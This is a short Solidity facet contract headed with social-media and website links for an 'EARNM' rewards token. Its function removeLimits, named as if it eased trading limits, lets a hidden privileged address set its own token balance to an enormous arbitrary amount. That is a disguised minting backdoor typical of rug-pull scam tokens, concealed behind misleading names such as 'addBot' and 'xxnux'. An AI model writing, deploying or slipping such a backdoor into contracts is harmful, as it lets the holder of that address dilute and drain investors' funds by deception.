/*
 * SPDX-License-Identifier: MIT
 * Telegram: https://t.me/EARNMrewards
 * Twitter: https://twitter.com/earnmrewards
 * Website: https://www.earnm.com/?utm_source=icodrops
 * Discord: https://discord.com/invite/earnm
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
